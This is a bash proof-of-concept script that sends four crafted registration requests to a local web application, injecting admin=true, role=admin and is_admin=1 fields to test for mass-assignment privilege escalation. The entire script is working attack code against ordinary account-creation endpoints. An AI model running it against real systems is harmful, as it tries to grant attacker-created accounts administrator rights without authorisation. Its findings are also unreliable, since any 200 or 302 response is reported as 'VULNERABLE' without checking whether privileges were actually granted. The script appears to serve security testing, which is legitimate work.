#!/bin/bash

# POC: Privilege Escalation via Admin Parameter Injection During Registration
# This script demonstrates mass assignment vulnerability allowing injection of 
# privilege escalation parameters during user registration

TARGET_URL="http://localhost:80/register"
TIMESTAMP=$(date +%s%N)

echo "============================================"
echo "Admin Parameter Injection Registration POC"
echo "============================================"
echo ""

# Test 1: Inject admin=true parameter
echo "[*] Test 1: Injecting admin=true parameter"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "username=admintest_${TIMESTAMP}&password=TestPass123&first_name=Admin&last_name=Test&email=admin_${TIMESTAMP}@example.com&admin=true")

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "HTTP Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: admin=true parameter was silently accepted"
    echo "  Response: $BODY"
else
    echo "✗ Parameter rejected with status $HTTP_CODE"
fi
echo ""

# Test 2: Inject role=admin parameter
echo "[*] Test 2: Injecting role=admin parameter"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "username=roletest_${TIMESTAMP}&password=TestPass123&first_name=Role&last_name=Test&email=role_${TIMESTAMP}@example.com&role=admin")

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "HTTP Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: role=admin parameter was silently accepted"
    echo "  Response: $BODY"
else
    echo "✗ Parameter rejected with status $HTTP_CODE"
fi
echo ""

# Test 3: Inject is_admin=1 parameter
echo "[*] Test 3: Injecting is_admin=1 parameter"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "username=is_admin_test_${TIMESTAMP}&password=TestPass123&first_name=IsAdmin&last_name=Test&email=is_admin_${TIMESTAMP}@example.com&is_admin=1")

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "HTTP Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: is_admin=1 parameter was silently accepted"
    echo "  Response: $BODY"
else
    echo "✗ Parameter rejected with status $HTTP_CODE"
fi
echo ""

# Test 4: Inject multiple privilege parameters simultaneously
echo "[*] Test 4: Injecting multiple privilege parameters"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
  -d "username=multi_test_${TIMESTAMP}&password=TestPass123&first_name=Multi&last_name=Test&email=multi_${TIMESTAMP}@example.com&admin=true&role=admin&is_admin=1")

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "HTTP Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: Multiple privilege parameters were silently accepted"
    echo "  Response: $BODY"
else
    echo "✗ Parameter rejected with status $HTTP_CODE"
fi
echo ""

echo "============================================"
echo "POC Complete"
echo "============================================"